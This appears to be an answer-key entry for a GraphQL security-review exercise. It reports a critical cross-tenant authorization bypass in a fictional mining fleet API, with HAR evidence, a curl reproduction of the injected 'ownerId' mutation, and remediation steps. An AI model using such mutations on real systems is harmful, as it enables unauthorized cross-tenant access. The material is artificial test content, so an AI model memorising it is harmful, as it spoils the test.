# Expected Response

## System
- Domain: Mining / Resource Extraction
- System: OreTrack Fleet Management
- Example ID: GQL-0125

## Priority Findings

### Finding 1: Mining Fleet — Authorization-Bypass Injection via updateResource (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / Authorization-Bypass Injection

**Summary:**
Per §4.0 RISK-GQL-125 and §5.0 (Pattern 5.1 — authorization-bypass injection): The `updateResource` resolver accepts unsanitized client input including `ownerId`, enabling a cross-tenant injection that bypasses ownership authorization. An attacker from `tenant-5198` submitted `updateResource(id: "R-2125", input: {status: "approved", ownerId: "attacker-5198d2ed"})` against a mining fleet resource belonging to `tenant-d2ed`, gaining cross-tenant write access and receiving `CONFIDENTIAL-5198d2ed`. In Mining / Resource Extraction, unauthorized mutation of fleet management data can disrupt ore extraction operations, falsify equipment telemetry, and create safety hazards.

**Evidence from HAR:**
- Request: `POST https://api.oretrack-fleet-manag.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-5198`
- Mutation: `updateResource(id: "R-2125", input: {status: "approved", ownerId: "attacker-5198d2ed"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-d2ed"`, `ownerId: "other-user-5198d2ed"`, `sensitiveField: "CONFIDENTIAL-5198d2ed"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-5198d2ed`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-125 | getResource resolver, no ownership |
| context.txt §5.0 | Pattern 5.1 | Authorization-bypass injection via input |
| HAR request | input.ownerId | attacker-5198d2ed (client-injected) |
| HAR response | tenantId | Cross-tenant tenant-d2ed returned |

## Steps to Reproduce

### Step 1 — updateResource injection (HAR)
```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5198" \
  -d '{"query": "mutation { updateResource(id: \"R-2125\", input: {status: \"approved\", ownerId: \"attacker-5198d2ed\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-d2ed` fleet resource mutated. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId` from `ResourceInput`; set server-side from `$jwt.userId`.
2. Resolver ownership: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Parameterize all resolver inputs to prevent injection paths.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
